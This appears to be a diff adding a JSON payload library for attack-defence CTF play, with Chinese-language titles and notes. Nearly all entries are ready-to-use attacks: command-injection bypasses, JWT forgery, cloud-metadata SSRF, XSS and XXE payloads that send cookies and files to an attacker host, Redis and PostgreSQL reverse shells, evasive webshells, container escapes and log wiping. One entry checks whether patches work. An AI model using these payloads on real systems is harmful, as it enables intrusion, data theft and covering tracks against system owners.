@@ -1,0 +1,212 @@
+{
+ "payloads": [
+  {
+   "id": "payload-multi-cmd-bypass",
+   "title": "命令执行: 分隔符 / 编码 / 通配符全集",
+   "language": "mixed",
+   "category": "rce",
+   "description": "过滤不严时按顺序试：分隔符 → 空格替换 → 关键字拆分 → 编码还原。",
+   "body": ";id  &&id  ||id  |id  %0aid  `id`  $(id)  \\n id\n# 空格\n$IFS  ${IFS}  $IFS$9  %09  %20  <  >  {cat,/etc/passwd}\n# 关键字\nc'a't /etc/passwd\nc\"\"at /etc/passwd\n/???/??t /etc/passwd        # 通配符\n$(printf 'cat') /etc/passwd\necho Y2F0IC9ldGMvcGFzc3dk|base64 -d|sh\n# 变量拼接\na=c;b=at;$a$b /etc/passwd\n# 内建\n{echo,id}\n# Windows\nwhoami & dir & type C:\\flag.txt\ncmd /c \"whoami\"\npowershell -c \"whoami\"\npo^w^e^r^s^h^e^l^l -c whoami"
+  },
+  {
+   "id": "payload-multi-jwt-none",
+   "title": "JWT: none / 弱密钥 / 头注入（通用）",
+   "language": "mixed",
+   "category": "jwt",
+   "description": "三分钟能跑完的 JWT 检查清单，先 none，再爆破，再头注入。",
+   "body": "# 1) none（大小写都试）\neyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.\n# 2) 空签名 / 保留原签名\n# 3) 弱密钥\nhashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt\njohn jwt.txt --wordlist=rockyou.txt --format=HMAC-SHA256\n# 4) 头注入\n{\"alg\":\"HS256\",\"kid\":\"../../../../dev/null\"}\n{\"alg\":\"HS256\",\"jku\":\"http://ATTACKER/jwks.json\"}\n{\"alg\":\"RS256\",\"x5u\":\"http://ATTACKER/c.pem\"}\n# 5) 算法混淆 RS256→HS256（公钥当密钥）\n# 6) 声明篡改\n{\"sub\":\"admin\",\"role\":\"admin\",\"is_admin\":true,\"exp\":9999999999}"
+  },
+  {
+   "id": "payload-multi-ssrf-cloud",
+   "title": "SSRF: 云元数据与内网服务清单",
+   "language": "mixed",
+   "category": "ssrf",
+   "description": "拿到 SSRF 先打元数据拿凭据，再横向内部面板。",
+   "body": "# AWS\nhttp://169.254.169.254/latest/meta-data/\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/\nhttp://169.254.169.254/latest/user-data\n# 阿里云\nhttp://100.100.100.200/latest/meta-data/\n# GCP（需 Header: Metadata-Flavor: Google）\nhttp://metadata.google.internal/computeMetadata/v1/\n# Azure\nhttp://169.254.169.254/metadata/instance?api-version=2021-02-01\n# 内网常见\nhttp://127.0.0.1:2375/containers/json          Docker API\nhttp://127.0.0.1:8500/v1/agent/self            Consul\nhttp://127.0.0.1:8080/actuator/env             Spring\nhttp://127.0.0.1:9200/_cat/indices             ES\nhttp://127.0.0.1:6379/                        Redis（配 gopher）\nhttp://127.0.0.1:9000/                        PHP-FPM"
+  },
+  {
+   "id": "payload-multi-ldap",
+   "title": "LDAP 注入",
+   "language": "mixed",
+   "category": "ldap",
+   "description": "登录框拼接 (&(uid=INPUT)(userPassword=INPUT)) 时可用通配符与逻辑运算绕过。",
+   "body": "*\n*)(uid=*))(|(uid=*\nadmin)(&)\nadmin)(|(password=*\n*)(objectClass=*\n)(cn=*\n# 盲注（按属性逐位）\nadmin)(|(description=a*)\nadmin)(|(userPassword=a*)\n# 空口令\nadmin)(&(userPassword=*\n# 过滤绕过\n\\2a  \\28  \\29  \\00  \\5c"
+  },
+  {
+   "id": "payload-multi-xpath",
+   "title": "XPath 注入",
+   "language": "mixed",
+   "category": "xpath",
+   "description": "XPath 无注释语法，靠括号闭合与 or 恒真绕过登录校验。",
+   "body": "' or '1'='1\n' or 1=1 or ''='\nx' or name()='username' or 'a'='b\n# 盲注\n' or string-length(name(/*[1]))=5 or '1'='2\n' or substring(name(/*[1]),1,1)='a' or '1'='2\n# 读节点\n' or count(/*)=1 or 'a'='b"
+  },
+  {
+   "id": "payload-multi-crlf",
+   "title": "CRLF 注入 / 响应拆分",
+   "language": "mixed",
+   "category": "crlf",
+   "description": "所有进 header 的参数都试一遍，常见于跳转、下载、邮件。",
+   "body": "%0d%0aSet-Cookie:%20admin=1\n%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK\n%0aSet-Cookie:%20a=1\n%E5%98%8A%E5%98%8DSet-Cookie:%20a=1      # UTF-8 宽字符绕过\n%0d%0a%0d%0a<script>alert(1)</script>\n# 常见点\n?url=  ?next=  ?filename=  ?redirect=  ?callback="
+  },
+  {
+   "id": "payload-multi-smtp",
+   "title": "邮件头注入 / SMTP 注入",
+   "language": "mixed",
+   "category": "crlf",
+   "description": "联系表单拼接 From/To 时可注入额外收件人或 BCC，用于钓鱼与外带。",
+   "body": "test@a.com%0d%0aBcc:attacker@evil.com\ntest@a.com%0d%0aSubject:%20pwned\ntest@a.com%0a%0a<html>phishing</html>\n# SMTP 命令注入\nhelo x\nmail from:<a@b>\nrcpt to:<victim@target>\ndata\nSubject: hi\n.\nquit"
+  },
+  {
+   "id": "payload-multi-open-redirect",
+   "title": "开放重定向绕过清单",
+   "language": "mixed",
+   "category": "open-redirect",
+   "description": "跳转白名单常只校验前缀/域名包含，用这些变体绕过。",
+   "body": "?next=https://evil.com\n?next=//evil.com\n?next=/\\evil.com\n?next=https:evil.com\n?next=https://target.com.evil.com\n?next=https://evil.com#target.com\n?next=https://evil.com?target.com\n?next=////evil.com\n?next=%2f%2fevil.com\n?next=//evil.com/%2e%2e/\n?next=https://target.com@evil.com"
+  },
+  {
+   "id": "payload-multi-graphql",
+   "title": "GraphQL: 内省与注入",
+   "language": "mixed",
+   "category": "graphql",
+   "description": "先内省拿 schema，再找未授权字段、批量查询与 SQL/NoSQL 注入点。",
+   "body": "# 内省\n{__schema{types{name fields{name args{name}}}}}\n# 单字段探测\n{__typename}\n# 批量绕过限流\n[{query:\"{a}\"},{query:\"{b}\"}]\n# 注入\n{user(id:\"1' or '1'='1\"){name}}\n{user(id:\"1) { name } #\"){name}}\n# 别名批量爆破登录\nmutation{m1:login(u:\"admin\",p:\"1\")m2:login(u:\"admin\",p:\"2\")}"
+  },
+  {
+   "id": "payload-multi-race",
+   "title": "竞态条件: 并发利用骨架",
+   "language": "mixed",
+   "category": "race-condition",
+   "description": "优惠券、余额、限次接口用单包多请求（HTTP/2 单连接）最容易打中。",
+   "body": "# 1) 单包多请求（turbo intruder / 自写 raw socket）\n# 2) 并发脚本\nimport asyncio,aiohttp\nasync def hit(s,i):\n    async with s.post(URL,data={'coupon':'X'}) as r: print(i,r.status)\nasync def main():\n    async with aiohttp.ClientSession() as s:\n        await asyncio.gather(*[hit(s,i) for i in range(50)])\nasyncio.run(main())\n# 3) 观察点：余额、库存、限次、文件写入、验证码校验\n# 4) 子状态技巧：先 GET 再 POST，保证同时到达"
+  },
+  {
+   "id": "payload-multi-smuggle",
+   "title": "HTTP 请求走私原始包",
+   "language": "mixed",
+   "category": "request-smuggling",
+   "description": "前端与后端对 CL/TE 解析不一致时可用；先 CL.TE，再 TE.CL，再 TE.TE 混淆。",
+   "body": "# CL.TE\nPOST / HTTP/1.1\nHost: TARGET\nContent-Length: 13\nTransfer-Encoding: chunked\n\n0\n\nSMUGGLED\n# TE.CL\nPOST / HTTP/1.1\nHost: TARGET\nContent-Length: 3\nTransfer-Encoding: chunked\n\n8\nSMUGGLED\n0\n\n# TE.TE 混淆\nTransfer-Encoding: chunked\nTransfer-Encoding: x\nTransfer-Encoding : chunked\nTransfer-Encoding:\\tchunked"
+  },
+  {
+   "id": "payload-multi-xss-polyglot",
+   "title": "XSS 通用 polyglot 与上下文适配",
+   "language": "mixed",
+   "category": "xss",
+   "description": "一个 payload 打通多种上下文，配合无交互外带。",
+   "body": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>\\x3e\n# 属性内\n\" onmouseover=\"alert(1)\n' onfocus='alert(1)' autofocus='\n# script 内\n</script><svg onload=alert(1)>\n';alert(1);//\n# href 内\njavascript:alert(1)\n# 外带 cookie\n<script>new Image().src='http://ATTACKER/?c='+document.cookie</script>\n<img src=x onerror=\"fetch('http://ATTACKER/?c='+document.cookie)\">"
+  },
+  {
+   "id": "payload-multi-sqli-waf",
+   "title": "SQLi WAF 绕过语法变体",
+   "language": "mixed",
+   "category": "sqli",
+   "description": "关键字被拦时换等价语法，注释/内联注释/大小写/编码轮着上。",
+   "body": "/*!50000union*/ /*!50000select*/ 1,2,3\nunion%0aselect 1,2,3\nuNiOn SeLeCt 1,2,3\nunion(select(1),2,3)\n1/**/or/**/1=1\n1 or 1 like 1\n1 || 1=1\n# 等价函数\nsubstr→mid→substring→left\nascii→ord\nconcat→concat_ws→group_concat\nsleep→benchmark→heavy query\n# 空格\n%09 %0a %0b %0c %0d %a0 /**/ ()\n# 引号\n0x61646d696e  char(97,100,109,105,110)"
+  },
+  {
+   "id": "payload-multi-xxe-param",
+   "title": "XXE: 参数实体 OOB 模板",
+   "language": "mixed",
+   "category": "xxe",
+   "description": "无回显时的标准套路：外部 DTD + 参数实体 + 带外通道。",
+   "body": "<?xml version=\"1.0\"?>\n<!DOCTYPE r [\n  <!ENTITY % remote SYSTEM \"http://ATTACKER/e.dtd\">\n  %remote;\n  %int;\n  %trick;\n]>\n<r>&send;</r>\n# e.dtd\n<!ENTITY % file SYSTEM \"file:///etc/passwd\">\n<!ENTITY % int \"<!ENTITY &#37; trick SYSTEM 'http://ATTACKER/?p=%file;'>\">\n# 换行截断时改用 FTP\n<!ENTITY % int \"<!ENTITY &#37; trick SYSTEM 'ftp://ATTACKER:2121/%file;'>\">"
+  },
+  {
+   "id": "payload-multi-upload-svg",
+   "title": "文件上传: SVG / HTML / PDF 利用",
+   "language": "mixed",
+   "category": "upload",
+   "description": "图片白名单里常漏 SVG，可直接 XSS 或配合 SSRF。",
+   "body": "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(document.domain)\"/>\n<svg><script>alert(1)</script></svg>\n<?xml version=\"1.0\"?><svg xmlns=\"http://www.w3.org/2000/svg\"><image href=\"http://169.254.169.254/latest/meta-data/\"/></svg>\n# HTML 直接上传\n<html><body><script>fetch('http://ATTACKER/?c='+document.cookie)</script></body></html>\n# PDF 内嵌 JS\n/OpenAction << /S /JavaScript /JS (app.alert(1)) >>\n# 文件名 XSS\n\"><svg onload=alert(1)>.png"
+  },
+  {
+   "id": "payload-multi-template-include",
+   "title": "模板包含 / 服务端模板路径穿越",
+   "language": "mixed",
+   "category": "lfi",
+   "description": "模板引擎按名加载文件时可用 ../ 或绝对路径读任意文件。",
+   "body": "?tpl=../../../../etc/passwd\n?tpl=/etc/passwd\n?tpl=php://filter/convert.base64-encode/resource=index\n?view=..%2f..%2f..%2fetc%2fpasswd\n# Twig/Freemarker 动态 include\n{{include(template_from_string(\"{{7*7}}\"))}}\n<#include \"/etc/passwd\">"
+  },
+  {
+   "id": "payload-multi-h2",
+   "title": "H2 数据库控制台 / JDBC 利用",
+   "language": "mixed",
+   "category": "rce",
+   "description": "H2 常随 Spring Boot 测试依赖带出，控制台无口令即可执行 Java。",
+   "body": "# 访问控制台\n/h2-console\njdbc:h2:mem:test\n# 建别名执行命令\nCREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\"\\\\\\\\A\"); return s.hasNext() ? s.next() : \"\"; }';\nCALL EXEC('id');\n# JDBC URL 侧利用\njdbc:h2:mem:test;INIT=RUNSCRIPT FROM 'http://ATTACKER/x.sql'"
+  },
+  {
+   "id": "payload-multi-redis",
+   "title": "Redis 未授权: 写文件 / 主从 / 计划任务",
+   "language": "mixed",
+   "category": "rce",
+   "description": "6379 未授权时三条主路：写 webshell、写 crontab、主从复制加载模块。",
+   "body": "redis-cli -h TARGET\nconfig set dir /var/www/html\nconfig set dbfilename x.php\nset x \"<?php @eval($_POST[1]);?>\"\nsave\n# crontab\nconfig set dir /var/spool/cron\nconfig set dbfilename root\nset x \"\\n*/1 * * * * bash -i >& /dev/tcp/ATTACKER/4444 0>&1\\n\"\nsave\n# 主从复制 RCE\nredis-cli -h TARGET slaveof ATTACKER 6379\nredis-rogue-server.py --rhost TARGET --lhost ATTACKER\n# SSH 公钥\nconfig set dir /root/.ssh\nset x \"\\n\\nssh-rsa AAAA...\\n\\n\"\nconfig set dbfilename authorized_keys\nsave"
+  },
+  {
+   "id": "payload-multi-mysql-udf",
+   "title": "MySQL 写文件与 UDF 提权",
+   "language": "mixed",
+   "category": "rce",
+   "description": "有 FILE 权限就能读文件；secure_file_priv 为空时可写 shell 或 UDF。",
+   "body": "select @@version, @@secure_file_priv, current_user();\nselect load_file('/etc/passwd');\nselect '<?php eval($_POST[1]);?>' into outfile '/var/www/html/x.php';\nselect unhex('3c3f706870...') into dumpfile '/var/www/html/x.php';\n# UDF\nselect unhex('7f454c46...') into dumpfile '/usr/lib/mysql/plugin/x.so';\ncreate function sys_eval returns string soname 'x.so';\nselect sys_eval('id');\n# 提权（MySQL 以 root 跑）\n# 常见：mysql.user 里改 plugin 为 mysql_native_password 换口令"
+  },
+  {
+   "id": "payload-multi-postgres-copy",
+   "title": "PostgreSQL 命令执行与读写",
+   "language": "mixed",
+   "category": "rce",
+   "description": "COPY ... TO PROGRAM 需要超级用户；普通用户可试大对象与 lo_export。",
+   "body": "copy (select '') to program 'id > /tmp/o';\ncopy (select '') to program 'bash -c \"bash -i >& /dev/tcp/ATTACKER/4444 0>&1\"';\ncreate table x(t text); copy x from program 'cat /etc/passwd';\n# 读文件\nselect pg_read_file('/etc/passwd');\n# 写文件\ncopy (select '<?php eval($_POST[1]);?>') to '/var/www/html/x.php';\n# 大对象\nselect lo_import('/etc/passwd');\nselect lo_export(lo_creat(0), '/tmp/x');"
+  },
+  {
+   "id": "payload-multi-mongo",
+   "title": "MongoDB 未授权导出与利用",
+   "language": "mixed",
+   "category": "nosqli",
+   "description": "27017 无认证时直接 dump；JS 引擎开启时可服务端执行。",
+   "body": "mongo TARGET:27017\nshow dbs\nuse app\ndb.getCollectionNames()\ndb.users.find().pretty()\n# 导出\nmongoexport --host TARGET -d app -c users --out users.json\n# 服务端 JS\ndb.users.find({$where:\"sleep(100)\"})\ndb.users.find({$where:\"function(){return this.user=='admin'}\"})\n# 写文件（老版本）\ndb.users.insert({a:{$eval:...}})"
+  },
+  {
+   "id": "payload-multi-k8s",
+   "title": "容器 / K8s API 利用",
+   "language": "mixed",
+   "category": "rce",
+   "description": "容器内先看 token 与挂载，再打 apiserver 或 Docker socket。",
+   "body": "cat /var/run/secrets/kubernetes.io/serviceaccount/token\nenv | grep -i kube\n# 列 pod\ncurl -k -H \"Authorization: Bearer $TOKEN\" https://kubernetes.default/api/v1/namespaces/default/pods\n# 建特权 pod 挂宿主\nkubectl --token=$TOKEN create -f evil.yaml\n# Docker socket\ncurl --unix-socket /var/run/docker.sock http://x/containers/json\ndocker -H unix:///var/run/docker.sock run -v /:/mnt -it alpine chroot /mnt sh"
+  },
+  {
+   "id": "payload-multi-webshell-min",
+   "title": "极简 Webshell 家族（多语言）",
+   "language": "mixed",
+   "category": "rce",
+   "description": "短小、低特征，适合绕过上传内容检测；记得改连接密码与混淆。",
+   "body": "<?php @eval($_POST['a']);?>\n<?php assert($_REQUEST['a']);?>\n<?=`{$_GET['a']}`;?>\n<?php $a='ass'.'ert';$a($_POST['a']);?>\n<%@ Page Language=\"C#\"%><%System.Diagnostics.Process.Start(\"/bin/sh\",\"-c \"+Request[\"c\"]);%>\n<% Runtime.getRuntime().exec(request.getParameter(\"c\")); %>\n<%\n  String c = request.getParameter(\"c\");\n  Process p = Runtime.getRuntime().exec(new String[]{\"/bin/sh\",\"-c\",c});\n  java.util.Scanner s = new java.util.Scanner(p.getInputStream()).useDelimiter(\"\\\\A\");\n  out.print(s.hasNext()?s.next():\"\");\n%>\n# Node\nrequire('http').createServer((q,s)=>s.end(require('child_process').execSync(q.url.slice(2)+''))).listen(31337)"
+  },
+  {
+   "id": "payload-multi-fix-check",
+   "title": "修复自检: 验证补丁是否真的生效",
+   "language": "mixed",
+   "category": "info-leak",
+   "description": "AWD 修完必须回归验证，否则被同一 payload 二次打穿要扣分。",
+   "body": "# 1) SQLi 修复验证：原 payload 应报错或无结果\n1' and 1=1--+   →  与 1' and 1=2--+  返回应一致\n# 2) 命令执行：注入点应无输出\n;id   $(id)   `id`\n# 3) 文件包含：非白名单路径应被拒\n?file=../../../../etc/passwd\n?file=/etc/passwd\n# 4) 上传：危险扩展应被拒（含双扩展、大小写、%00）\nx.php  x.php.jpg  x.PHP  x.php%00.jpg\n# 5) 反序列化：非法数据应抛异常而非执行\nO:8:\"stdClass\":0:{}   {\"__proto__\":{\"x\":1}}\n# 6) XSS：输出应被转义\n<script>alert(1)</script>  \"><svg onload=alert(1)>\n# 7) 越权：换低权限账号访问同接口应 403"
+  },
+  {
+   "id": "payload-multi-flag-hunt",
+   "title": "Flag 定位与读取（AWD 抢分）",
+   "language": "mixed",
+   "category": "info-leak",
+   "description": "AWD 的 flag 通常在固定目录轮换，抢到即得分；先看进程与挂载缩小范围。",
+   "body": "find / -maxdepth 4 -iname '*flag*' 2>/dev/null\nls -la /flag /flag.txt /root/flag* /tmp/flag* 2>/dev/null\ncat /proc/1/cmdline | tr '\\0' ' '\nmount | grep -Ei 'flag|secret'\nenv | grep -i flag\n# 常见位置\n/flag  /flag.txt  /root/flag  /home/*/flag  /tmp/flag  /var/www/flag.php\n/var/www/html/flag.php\n# 通过 Web 读\ncurl 'http://TARGET/flag.php'\ncurl 'http://TARGET/?file=/flag'\n# 数据库里\nmysql -e 'select * from flag' 2>/dev/null"
+  },
+  {
+   "id": "payload-multi-log-clean",
+   "title": "日志与痕迹清理（复盘用）",
+   "language": "mixed",
+   "category": "info-leak",
+   "description": "AWD 里清理只影响对抗复盘，不要动比赛平台的计分文件；仅在自己的靶机上操作。",
+   "body": "# Web 访问日志\n> /var/log/nginx/access.log\n> /var/log/apache2/access.log\n# 自己的 shell 与临时文件\nrm -f /tmp/x.php /tmp/sess_* /tmp/.a\n# 上传的 webshell\nfind /var/www -name '*.php' -newermt '-2 hour' 2>/dev/null\n# 注意：不要删除平台 flag / 计分脚本"
+  }
+ ]
+}
